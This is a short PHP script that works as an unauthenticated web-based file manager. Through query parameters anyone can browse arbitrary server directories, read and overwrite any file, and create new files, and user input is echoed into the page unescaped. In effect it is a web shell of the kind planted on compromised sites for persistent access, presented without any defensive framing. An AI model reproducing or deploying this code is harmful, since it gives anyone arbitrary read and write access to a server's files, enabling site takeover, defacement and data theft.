<?php $pv=phpversion();
 $current=basename($_SERVER['SCRIPT_FILENAME']);
 ?>
<?php 

if(!empty($_GET['newfile'])){

	$filename=$_GET['newfile'];
	$filepath=$_GET['filepath'];
	$fullpath=$filepath.$filename;
	$fp = fopen($filepath . $filename,"wb");
	fclose($fp);

	header("location:?file=$fullpath");

}

 ?>
<style type="text/css">
	.input{
		background: #000;
		border: 1px solid #fff;
		color:#fff;
		padding: 10px 15px;    
		font-family: monospace;
		font-weight: 100;
		font-size: 14px;
	}
</style>
<body style="background:#000; ">
	<br>

	<a style="float: right;" class="input" href="<?php echo $current ?>">x</a>
	<table>
		<tr><td>
			<form action="" method="get">
				<input class="input" style="min-width: 300px;" type="text" name="path" value="<?php if(!empty($_GET['path'])) echo $_GET['path']; ?><?php if(!empty($_GET['file'])) {
					if($pv<7) echo $backpath = dirname($_GET['file']).'/' ; else echo $backpath = dirname($_GET['file'], 1).'/' ; }?>">
				<input class="input" type="submit">
				<br>


			</form>

		</td>
		<td>
			<form action="" method="get">
				<input class="input" style="min-width: 300px;"  type="text" name="file" value="<?php if(!empty($_GET['file'])) echo $_GET['file']; ?>">
				<input class="input" type="submit">

			</form>
		</td>
		<td>

			<form action="" method="get">
				<input class="input" style="min-width: 200px;" type="text" name="newfile" value="">
				<input style="display: none;" class="input" style="min-width: 200px;" type="text" name="filepath" value="<?php if(!empty($_GET['path'])) echo  $path = $_GET['path']; ?>">
				<input value="New File" class="input" type="submit">
				<br>
				

			</form>
		</td>
	</tr>
</table>
<a style="color: #fff;"  href="?path=<?php echo dirname(__FILE__ ) ?>/">&nbsp; <?php echo dirname(__FILE__ ) ?></a> </span>
	
<br><br>



<?php if(!empty($_GET['file'])){ $file = $_GET['file']; 

// configuration
 $current=basename($_SERVER['SCRIPT_FILENAME']);


$url = $current.'?file='.$file;
// $file = 'about.php';

// check if form has been submitted
if (isset($_POST['text']))
{
    // save the text contents
	file_put_contents($file, $_POST['text']);

    // redirect to form again
	header(sprintf('Location: %s', $url));
	printf('<a href="%s">Saved.</a>.', htmlspecialchars($url));
	exit();
}

// read the textfile
$text = file_get_contents($file);


?>

<!-- HTML form -->
<form action="" method="post">
	<textarea style="width: 100%;min-height: 450px;padding: 15px;background: #000;color:#fff;    font-family: monospace;    font-weight: 100;    font-size: 14px;" name="text"><?php echo htmlspecialchars($text) ?></textarea>

	<br><br>
	<center>
		<input class="input" type="submit" />
		<input class="input" type="reset" />
	</center>
</form>

<?php } ?> 


<?php 

if(!empty($_GET['path'])){ $path = $_GET['path'];  {

	$scan    = $path;
	$files = scandir($scan);
	$files = array_diff(scandir($scan), array('.', '..'));
	?>


	<div class="input" style="max-height: 450px;    overflow: auto;"> 
					
					<?php  if($pv<7) $backpath = dirname($path).'/' ; else  $backpath = dirname($path, 1).'/' ; ?>
					 <a href="?path=<?php echo $backpath ?>">../</a>
					<br>
		<?php
		
		foreach ($files as $file) {
			//echo  $scan.'/'. $value . '<br>';



			    if(!is_file($path.$file)) {
			    	

			    	echo '<a style="color:#fff" href="?path='.$path.$file.'/">'.$file.'</a>';
			    	echo '<br>';
			    }

		}
		echo '<hr>';

		foreach ($files as $file) {
			//echo  $scan.'/'. $value . '<br>';

			    if(is_file($path.$file)) {
			    	

			    	echo '<a style="color:#fff" href="?file='.$path.$file.'">'.$file.'</a>';

			    	echo '<br>';
			    }

		}

		?>
	</div>

	<?php 
//print_r($files);
}
?>

<?php } ?>

</body>